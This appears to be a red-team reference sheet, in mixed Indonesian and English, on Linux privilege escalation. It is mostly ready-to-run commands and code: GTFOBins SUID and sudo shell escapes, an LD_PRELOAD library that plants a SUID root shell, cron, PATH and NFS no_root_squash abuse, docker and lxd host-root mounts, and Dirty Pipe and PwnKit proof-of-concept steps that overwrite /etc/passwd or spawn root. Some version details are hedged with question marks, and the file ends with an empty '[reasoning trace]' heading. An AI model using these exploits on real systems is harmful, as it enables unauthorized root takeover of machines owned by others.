# privesc-linux — linux

# Linux Privilege Escalation — Red Team Reference

## 1. Enumerasi Baseline

### 1.1 linpeas (PEASS-ng, rilis 2024+)

Required: unprivileged shell access, curl/wget or upload.

```bash
# Kirim via HTTP
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/lp.sh
chmod +x /tmp/lp.sh
./lp.sh -a 2>&1 | tee /tmp/lp.out
```

Surfaces: anomalous SUID/SGID, `cap_*` capabilities, writable cron, sudo `-l`, NFS exports, groups (docker/lxd/disk), kernel version, writable PATH dirs, writable `/etc/passwd`, credentials in env/history/`.git`.

Fails if: AV/EDR blocks, `noexec` on `/tmp`, missing curl/wget + cannot upload, rpm/restricted shell.

### 1.2 pspy (pspy64, rilis 1.2.0)

```bash
./pspy64 -pf -i 1000 2>&1 | tee /tmp/pspy.out
```

Monitor processes/cron every 1s without root. Surfaces: root cron running scripts in writable paths, `/bin/sh -c` from systemd timers, backup jobs with injectable arguments.

---

## 2. SUID / SGID Abuse (GTFOBins)

### 2.1 Enumerasi

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
# Bandingkan ke baseline GTFOBins; cek juga interpreter yg SUID
```

### 2.2 Payload keluarga GTFOBins

| Binary SUID | Command (root shell) | Requirement |
|---|---|---|
| `nmap` (≤5.20 w/ `--interactive`) | `nmap --interactive` → `!sh` | SUID + versi lama |
| `vim` / `vi` | `vim -c ':!/bin/sh'` | SUID |
| `find` | `find . -exec /bin/sh -p \; -quit` | `-p` mempertahankan EUID |
| `bash` | `/bin/bash -p` | SUID + not setuid-ignored |
| `less` / `more` | `less /etc/passwd` → `!sh` | SUID |
| `cp` | `cp /bin/sh /tmp/x; chmod +s /tmp/x; /tmp/x -p` | ≥ SUID |
| `env` | `env /bin/sh -p` | SUID |
| `awk` | `awk 'BEGIN{system("/bin/sh")}'` | SUID |
| `perl` | `perl -e 'exec "/bin/sh";'` | SUID + `-p` EUID utuh |
| `tar` | `tar cf /dev/null /etc/shadow --checkpoint=1 --checkpoint-action=exec=/bin/sh` | SUID |
| `python3` | `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'` | SUID |
| `mount` | `mount -o bind /bin/sh /bin/mount; mount` | SUID mount fails quickly; see note |
| `pkexec` | lihat §9 PwnKit | SUID + versi rentan |
| `sudo` | `sudo -l` | SUID + cek sudoers |

Confirm EUID: `id` if the spawned shell remains root — use `-p` (`bash -p`, `sh -p`) to prevent bash from dropping privileges.

### 2.3 Why it fails in the field
- Kernel ≥ 3.14 with `nosuid` mount (`/tmp`, `/home` via autofs).
- Modern SUID binaries (bash ≥ 4.3?) already drop privileges: SUID `/bin/bash` does not give a root shell without `-p`.
- Hardening: `fs.protected_suid_dumpable`, SELinux `nosuid`, or an AppArmor profile that restricts exec.

---

## 3. Linux Capabilities

### 3.1 Enumerasi

```bash
getcap -r / 2>/dev/null
# Alternatif
find / -type f -exec getcap {} \; 2>/dev/null
```

### 3.2 Payload capability

| Binary | Cap | Payload |
|---|---|---|
| `python3` | `cap_setuid+ep` | `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'` |
| `perl` | `cap_setuid+ep` | `perl -e 'use POSIX; setuid(0); exec "/bin/sh";'` |
| `tar` | `cap_dac_read_search+ep` | `tar -cvf /tmp/shadow.tar /etc/shadow` (baca shadow) |
| `openssl` / `gdb` | `cap_dac_read_search+ep` | baca `/etc/shadow` |
| `cap_net_raw+ep` on `ping`/`tcpdump` | — | sniffer / ARP-spoof |
| `cap_net_admin+ep` on `nmap`/`tcpdump` | — | raw socket / veth |

### 3.3 Why it fails
- `ep` vs `p`: `cap_setuid+p` without `e` does not apply to normal exec (requires `capsh --inh` or filecap in user-ns space).
- `nosuid` filesystem does not disable capabilities (separate). However, `nosuid` + `--` on some distros also ignores `security.capability` when `noexec`.
- Modern container runtimes (Docker 25+, containerd) drop all caps from the default set — SUID from the image still works but caps are gone.

---

## 4. sudo Misconfiguration

### 4.1 Enumerasi

```bash
sudo -n -l                 # tanpa password
sudo -l                    # butuh password user
ls -la /etc/sudoers.d/     # bila bisa dibaca
cat /etc/sudoers 2>/dev/null
```

### 4.2 `NOPASSWD` for GTFOBins binaries

Common incorrect sudo format:

```
user ALL=(ALL) NOPASSWD: /usr/bin/vim
user ALL=(ALL) NOPASSWD: /usr/bin/python3 /opt/app.py
user ALL=(root) NOPASSWD: /usr/bin/systemctl
```

| Entry | Escalation |
|---|---|
| `vim` | `sudo vim -c ':!/bin/sh'` |
| `less`/`more` | `sudo less /etc/shadow` → `!sh` |
| `find` | `sudo find / -exec /bin/sh \; -quit` |
| `tar` | `sudo tar cf /dev/null x --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| `env` | `sudo env /bin/sh` |
| `awk` | `sudo awk 'BEGIN{system("/bin/sh")}'` |
| `systemctl` | `sudo systemctl edit x` writes a unit; or `sudo systemctl status x` → `!sh` if pager |
| `docker`/`podman` | lihat §8 |
| `apt`/`apt-get` | `sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh` |
| `zip`/`unzip` | `sudo zip /tmp/x /etc/hosts -T --unzip-command="sh -c /bin/sh"` |
| `journalctl` | `sudo journalctl` → `!sh` if pager is unsafe |

### 4.3 `sudoedit`

Classic flaw: `sudoedit` is executed as the user with the **user's** `EDITOR` — not root. If `sudoers` contains:

```
user ALL=(ALL) NOPASSWD: sudoedit /etc/nginx/nginx.conf
```

Not directly a shell. But if the pattern is a wildcard and the target is writable via symlink, or if `sudoedit` (version < 1.8.31) allows path traversal `../../../` in the file argument, read/write root files.

Payload symlink:

```bash
ln -s /etc/shadow /tmp/evil
sudo sudoedit /tmp/evil      # hanya bila target di sudoers mencakup /tmp/evil
```

### 4.4 `env_keep` + `LD_PRELOAD`

Sudoers:

```
Defaults env_keep += "LD_PRELOAD"
```

Or in `/etc/ld.so.preload`. Payload:

```c
/* /tmp/x.c */
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
__attribute__((constructor)) void init(void){
    setuid(0); setgid(0);
    system("cp /bin/sh /tmp/rootshell; chmod 4755 /tmp/rootshell");
}
```

```bash
gcc -shared -fPIC -o /tmp/x.so /tmp/x.c
sudo LD_PRELOAD=/tmp/x.so /bin/true
/tmp/rootshell -p
```

Also check other `env_keep`: `LD_AUDIT`, `LD_LIBRARY_PATH`, `PYTHONPATH`, `PERL5OPT`, `RUBYOPT`, `GEM_HOME`, `NODE_OPTIONS`.

### 4.5 Why sudo fails
- `secure_path` mengabaikan `PATH` user → PATH hijack gugur.
- `env_reset` (default) removes `LD_PRELOAD`, `LD_LIBRARY_PATH` → §4.4 does not work even if `env_keep` is not explicitly configured.
- `sudo` ≥ 1.9.x with `sudoedit_checkdir` (default on since 1.8.15) blocks symlink traversal.
- `requiretty` / `use_pty` memutus eksfil via pager interaktif.

---

## 5. Cron & systemd Timer Writable

### 5.1 Cron

```bash
ls -la /etc/cron.* /var/spool/cron /var/spool/cron/crontabs 2>/dev/null
cat /etc/crontab /etc/cron.d/* 2>/dev/null
crontab -l 2>/dev/null
# Watchdog: pspy64 -pf
```

Exploitation pattern:

| Scenario | Payload |
|---|---|
| Root script in writable path | `echo 'cp /bin/sh /tmp/r; chmod 4755 /tmp/r' >> /opt/backup.sh` |
| Directory writable, script dihapus | `cp /bin/sh /opt/backup.sh; chmod +x /opt/backup.sh` (tunggu cron) |
| Wildcard path `tar *` in `/etc/cron.d` | tar wildcard injection (see §2.2) |
| `CRON` script without absolute shebang | minimal crontab PATH `/usr/bin:/bin` — hard to hijack |

Time scale: default cron every minute; `run-parts` scripts in `/etc/cron.hourly` can be delayed up to 1 hour.

### 5.2 systemd timer

```bash
systemctl list-timers --all
systemctl cat <timer>.timer <timer>.service
ls -la /etc/systemd/system/*.timer /lib/systemd/system/*.timer
```

Check `ExecStart=` points to a writable script/path, or writable `EnvironmentFile=` environment file:

```bash
# bila /etc/sysconfig/foo writable
echo 'ExecStart=/bin/sh -c "cp /bin/sh /tmp/r; chmod 4755 /tmp/r"' > /etc/sysconfig/foo
# tunggu timer; atau, bila unit writable:
systemctl restart suspicious.timer
```

### 5.3 Why it fails
- `root` cron uses `PATH=/usr/bin:/bin` and `SHELL=/bin/sh` — user PATH hijack has no effect.
- `cron` on Debian/Ubuntu has `pam_env`, custom environment is cleaned.
- Anacron vs cron: `/etc/cron.daily` via anacron runs once a day — narrow window.

---

## 6. PATH Hijack

### 6.1 Prerequisites & Enum

```bash
echo $PATH
find / -type d -writable 2>/dev/null
# Cari script root yang memanggil binary non-absolut
grep -rE 'system\(|popen\(|exec' /opt /usr/local 2>/dev/null | head
pspy64 -pf | grep -E 'sh -c|systemctl'
```

### 6.2 Payload

```bash
mkdir -p /tmp/x && cd /tmp/x
cat > gzip <<'EOF'
#!/bin/sh
cp /bin/sh /tmp/r && chmod 4755 /tmp/r
EOF
chmod +x gzip
export PATH=/tmp/x:$PATH
# tunggu script root yang memanggil `gzip`/`tar`/`python` tanpa path absolut
```

For sudo with `secure_path`: `sudo PATH=/tmp/x:$PATH cmd` does not work — `secure_path` overrides. However, if a root script calls `backup.sh` via relative `./backup`, and the script's cwd is writable, hijack the script.

### 6.3 Why it fails
- `secure_path` (sudo), `ENV_PATH` (cron/systemd) set an absolute PATH → user hijack does not apply.
- Binary is called absolutely (`/usr/bin/gzip`) in the script source.
- `fs.protected_symlinks=1` + symlink attack konsekuensi.

---

## 7. NFS `no_root_squash`

### 7.1 Enum target

```bash
showmount -e <target>
# atau dari shell target
cat /etc/exports
grep -E 'nfs|nfs4' /proc/mounts
```

Response `showmount`:

```
Export list for target:
/opt    *
/srv    *(rw,no_root_squash)
```

`no_root_squash` berarti UID 0 klien = UID 0 server.

### 7.2 Exploit — SUID drop

From the attacker host (local root):

```bash
mkdir -p /tmp/nfs && mount -t nfs -o vers=3 <target>:/srv /tmp/nfs
cat > /tmp/nfs/x.c <<'EOF'
#include <unistd.h>
int main(void){ setuid(0); setgid(0); execl("/bin/sh","sh",NULL); }
EOF
gcc -o /tmp/nfs/x /tmp/nfs/x.c && chmod 4755 /tmp/nfs/x
umount /tmp/nfs
```

On the target:

```bash
/srv/x        # root shell, karena suid dimiliki root DAN binary di NFS no_root_squash
```

### 7.3 Varian lain
- `/home` NFS no_root_squash → write `.ssh/authorized_keys` for root (if root's home is on NFS).
- `/etc` NFS no_root_squash → tulis `/etc/ld.so.preload`.
- Kerberos NFS (`sec=krb5`) blocks UID 0 claims — technique fails unless root NFS credentials exist.

### 7.4 Why it fails
- `root_squash` export (default) → client UID 0 is mapped to `nobody`.
- `all_squash` + `anonuid` → all UIDs flattened.
- Firewall: `rpcbind`/`nfsd` only 111/2049 internal.
- NFSv4 via `sec=sys` still works; `sec=krb5p` does not.

---

## 8. docker / lxd Group

### 8.1 Docker group

```bash
id
docker ps 2>/dev/null && echo DOCKER_GROUP_OK
```

Payload mount host:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# spesifik: drop SUID di host
docker run -v /:/mnt --rm -it alpine \
  sh -c 'cp /bin/sh /mnt/tmp/r; chmod 4755 /mnt/tmp/r'
```

Variation without internet:

```bash
docker run -v /:/mnt --rm -it --entrypoint /bin/sh <image_yang_ada>
```

If the docker socket (`/var/run/docker.sock`) is mounted into a container where you already have a shell — identical: `curl --unix-socket /var/run/docker.sock http://localhost/containers/json`.

### 8.2 lxd group

```bash
id | grep -o '\blxd\b' && lxc list
```

Payload:

```bash
# image alpine mini (harus tersedia/lokal, lxd tidak bisa pull tanpa network)
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
# di dalam: cp /bin/sh /mnt/root/tmp/r; chmod 4755 /mnt/root/tmp/r; exit
```

Alternative `security.privileged=false` with `root` idmap — lxd ≥ 3.x is still ok as long as the daemon is not hardened.

### 8.3 Why it fails
- Docker 25+/27+ with `userns-remap` → `--privileged` remains, but the host `/` bind-mount can still write because of the mount namespace? **No**: `userns-remap` maps container UID 0 to a non-root host UID, so `chmod 4755` in host `/tmp` becomes owned by a random UID — SUID does not become host root. Detection: `docker info | grep -i userns` or `cat /etc/docker/daemon.json`.
- Docker ≥ 20.10 with `no-new-privileges` default on some distros.
- lxd ≥ 5.0 with `security.privileged=true` is blocked if `/etc/subuid` is not prepared (image cannot idmap) or the `default` profile forces `security.nesting=false`.
- AppArmor/SELinux label `container_t` prevents writes to `host-root`.

---

## 9. Kernel CVE — Operational Summary

| CVE | Name | Affected kernel | Minimal payload | Prerequisites |
|---|---|---|---|---|
| CVE-2022-0847 | Dirty Pipe | 5.8 – 5.16.11 (fixed in 5.16.11/5.15.25/5.10.102) | Write `/etc/passwd` or overwrite SUID `/usr/bin/sudo` byte | unprivileged user; `splice()` does not require cap |
| CVE-2021-4034 | PwnKit (pkexec) | polkit 0.105–0.120 (Ubuntu 20.04, Debian 11, RHEL 8 default) | `pkexec` argc=0 → getenv argv overflow | `pkexec` SUID binary present; no specific kernel needed |
| CVE-2024-1086 | nf_tables UAF | Linux ≤ 6.6.14, slow-patching distros (Ubuntu 22.04 < 5.15.0-100) | `nft` user namespace + ruleset, trigger double-free → ROP | `unprivileged_userns_clone=1` or `kernel.unprivileged_userns_clone=1` |
| CVE-2023-32233 | nf_tables UAF (batch) | 6.3.1 ≤ kernel < 6.3.5; distros 5.15/6.1 not yet patched | nft batch replace, then unshare user-netns | userns enabled |
| CVE-2024-21626 | runc (Leaky Vessels) | runc ≤ 1.1.11 | `docker run --rm -w /proc/self/fd/7` | akses docker/podman |
| CVE-2023-0386 | OverlayFS UAF | Ubuntu ≤ 22.04 (5.15.0-69?), RHEL 8 | FUSE + overlay, drop SUID in lower file | userns + FUSE |

### 9.1 Dirty Pipe (concrete example)

From the public PoC `blasty-vs-dirtypipe`:

```bash
git clone https://github.com/.../CVE-2022-0847-dirty-pipe-poc
gcc -o dp dp.c
./dp /usr/bin/su /tmp/su.bak

# atau overwrite /etc/passwd: suntik root tanpa password
# root:$(openssl passwd -1 -salt x pwn):0:0:root:/root:/bin/bash
./dp /etc/passwd /tmp/passwd.bak
su root   # password: pwn
```

**Why it fails**: kernel ≥ 5.16.11, or distro `CONFIG_` patch even though the kernel banner looks old (backport). Verification: `uname -r` **alone is not enough** — check `/boot/config-$(uname -r)` or test a benign PoC (open a read-only file with `splice()` + `write` → `EPERM`).

### 9.2 PwnKit

```bash
# PoC: argv kosong -> pkexec baca env sebagai argv[0]
mkdir -p /tmp/pk && cd /tmp/pk
cat > pwn.c <<'EOF'
#include <unistd.h>
int main(int c, char**v){ char *a[]={"pkexec","--help",NULL}; char *e[]={"PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=/bin/sh", "GIO_USE_VFS=local", NULL}; execve("/usr/bin/pkexec", a, e); }
EOF
gcc -o pwn pwn.c && ./pwn
```

On default Ubuntu 20.04.3 / 21.04 / 21.10 / Debian 11, `pkexec` SUID + polkit is vulnerable → root shell without password. Fixed: polkit 0.120-1ubuntu2 (CVE-2021-4034).

**Why it fails**: polkit is patched, or `pkexec` is not SUID (RedHat/CentOS already — pkexec SUID but polkit 0.120 → **still vulnerable**; check `rpm -q polkit`), or `pkexec` is removed.

### 9.3 nf_tables CVE-2024-1086

Payload: `CVE-2024-1086` PoC (Notselwyn) — butuh user namespace (unprivileged):

```bash
sysctl kernel.unprivileged_userns_clone   # 1 = aktif, 0 = userns off
cat /proc/sys/kernel/unprivileged_userns_clone
```

If `0`, the technique fails on Debian/Ubuntu (default Ubuntu 24.04 is still 1; Debian 12 is still 1; RHEL 8/9 = 0).

**Why it fails**: `kernel.unprivileged_userns_clone=0`, `user.max_user_namespaces=0`, AppArmor profile on `unshare` (Ubuntu 24.04 `unprivileged_userns` restrict).

---

## 10. Field Operational Pitfalls (summary)

| Pitfall | Impact | Mitigation |
|---|---|---|
| `uname -r` does not reflect distro backports | Dirty Pipe / nf_tables PoC crashes or EPERM | Test distro patch via `apt changelog` / `rpm -q --changelog` / check `/proc/version_signature` (Ubuntu) |
| `unprivileged_userns_clone=0` + AppArmor restrict | All kernel-namespace exploits (1086, 32233, 0386) dead | Check `/proc/sys/user/max_user_namespaces`; use non-userns path |
| `userns-remap` Docker/LXD | §8 payload `chmod 4755` menghasilkan SUID milik UID non-root host | Baca `docker info`, `lxc profile show default` |
| `secure_path` + `env_reset` in sudo | PATH hijack & `LD_PRELOAD` dead | Check `sudo -l` for explicit `env_keep`; do not rely on defaults |
| NFS `root_squash` default | §7 suid drop does not become server root | `showmount -e`; check `/etc/exports` if present |
| `pkexec` already removed / polkit patched | PwnKit fails even with old kernel | Check package version, not kernel |
| Cron `PATH=/usr/bin:/bin` + script called by absolute path | §5/§6 dead | Focus on **writable** files, not path hijack |
| `pspy` does not catch processes <1s | Cron named `wget -q -O- ... \| sh` is missed | Lower interval `-i 100` or `-f` (inotify-like on /proc) |
| `noexec` on `/tmp`/`/dev/shm` | `.so` payload / script does not exec | Fallback `/var/tmp`, `memfd_create`, exec via interpreter (`python3 /tmp/x.py`) |
| Kernel SAS (SELinux/AppArmor) | `docker run -v /:/mnt` writes files but `chmod 4755` is denied by label | `getenforce` / `aa-status`; look for writable labeled `container_file_t` mounted to host `unconfined_t` |
| Docker daemon `--userns-remap` active | SUID drop does not escalate to host root | `docker info | grep -i userns`; alternative write `authorized_keys` to `/root` in the mount (works if container root UID 0 is still host root on certain mount paths — verify) |
| `sudo` ≥ 1.9 with `sudoedit_checkdir` | `sudoedit` symlink fails | Also look for `edit` wildcard & `sudo -e` to a directly writable directory |
| `cap_setuid+p` without `+e` | `python3` cap SUID does not escalate | Verify `getcap`; requires `cap_setuid+ep` or `cap_setuid+i` (inheritable) on exec |
| `nosuid` mount + SUID file | `find -perm -4000` false positive, exec does not escalate | `mount | grep nosuid`; check `findmnt -no OPTIONS <path>` |

---

## [reasoning trace]


